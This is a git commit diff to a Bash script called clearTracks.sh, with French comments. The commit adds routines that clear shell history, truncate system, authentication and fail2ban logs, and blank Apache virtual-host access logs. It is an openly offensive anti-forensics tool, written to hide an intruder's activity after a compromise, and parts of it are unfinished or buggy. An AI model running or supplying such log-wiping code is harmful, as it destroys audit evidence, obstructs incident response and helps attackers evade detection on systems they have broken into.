ddae112ccbd36f4bf7c33dca275815d5d24a63f8
root <root@localhost.localdomain>
2017-03-02 17:24:52 -0500

    clear httpd brutal way

--- Bash/clearTracks.sh
+++ Bash/clearTracks.sh
@@ -13,11 +13,64 @@ usage() {
 
 brutal_way() {
 echo "Clearing all logs..."
-rm /root/.bash_history
+history -cw
+echo " " > /root/.*history
+echo " " > /home/*/.*history
+echo " " > /var/log/syslog
+echo " " > /var/log/auth.log
+echo " " > /var/log/user.log
+echo " " > /var/log/messages
+
+if [ -f /var/log/fail2ban.log ]
+then
+  echo " " > /var/log/fail2ban.log
+fi
+
 }
 
 subtil_way() {
 echo "subtil way"
+}
+
+clear_http() {
+##Essayer d'effacer les logs HTTP en fonction d'où provient la co
+
+web_server=$(lsof -i | grep LISTEN | grep http | head -n 1 | awk '{print $1}')
+case ${web_server} in
+  apache2)
+    apache2_RHEL_dir="/etc/httpd/"
+    apache2_DEB_dir="/etc/apache2/"
+    if [ -d ${apache2_RHEL_dir} ];then
+      grep access.log ${apache2_RHEL_dir}/conf.d/* > /tmp/vhost_logs.txt
+      cat /tmp/vhosts_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
+      ##Mode bourrin : ON
+      cat /tmp/vhost_logs2.txt | while read line
+        do
+          echo "${line}"
+        done
+    
+     elif [ -d ${apache2_DEB_dir} ];then
+      grep access.log ${apache2_DEB_dir}/sites-enabled/* > /tmp/vhost_logs.txt
+      cat /tmp/vhosts_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
+      ##Mode bourrin : ON
+      cat /tmp/vhost_logs2.txt | while read line
+        do
+          echo " " > "${line}"
+        done
+  
+    fi
+    ;;
+  nginx)
+    nginx_dir="/etc/nginx/"
+    ;;
+  *)
+   echo "Unknown web server"
+   ;;
+esac
+}
+
+clear_ftp() {
+echo " test"
 }
 
 if [ -z ${1} ]
@@ -27,7 +80,8 @@ fi
 
 while getopts "bs" opt; do
   case $opt in
-    b) brutal_way
+    b) #brutal_way
+      clear_http
       ;;
     s) subtil_way
       ;;
